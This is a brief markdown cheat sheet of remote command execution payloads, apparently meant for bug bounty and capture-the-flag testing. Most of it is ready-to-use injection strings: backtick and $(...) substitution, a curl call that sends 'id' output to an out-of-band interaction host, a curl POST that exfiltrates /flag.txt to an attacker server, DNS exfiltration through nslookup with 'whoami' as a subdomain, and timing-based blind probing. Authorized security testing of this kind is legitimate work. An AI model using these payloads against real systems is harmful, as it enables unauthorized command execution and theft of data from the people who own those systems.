# Remote Command Execution

## Non-destructive commands

- pwd
- uname
- id
- hostname

These are good for BB programs

## Inline RCE

Use \` backticks

Example:

```
`echo 1.1.1.1`
```

Use subcommand

```
$(echo 1.1.1.1)
```

Combination

```
$(curl https://qdatsdqwvpduvmxhhulycpld80fmpl0mb.oast.fun/$(id))
```

## Blind RCE

Exfil data

```
$(curl -X POST -d $(cat /flag.txt) https://$SERVER)
```

## Blind over DNS

Using nslookup with command as subdomain

```
nslookup `whoami`.$SERVER.oast
```

## Blind (No Network)

Use an `if` statement with `sleep`.

